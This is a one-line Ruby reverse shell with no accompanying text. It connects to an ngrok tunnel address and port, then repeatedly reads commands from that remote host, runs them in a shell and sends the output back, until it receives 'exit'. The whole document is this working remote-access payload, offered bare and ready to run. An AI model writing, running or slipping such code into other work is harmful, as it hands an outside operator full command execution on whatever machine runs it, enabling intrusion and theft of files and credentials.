require 'socket';s=TCPSocket.new("6.tcp.eu.ngrok.io",15476);s.puts "Connected!";while true;s.print "$ ";cmd=s.gets.chomp;break if cmd=="exit";s.puts `#{cmd} 2>&1`;end
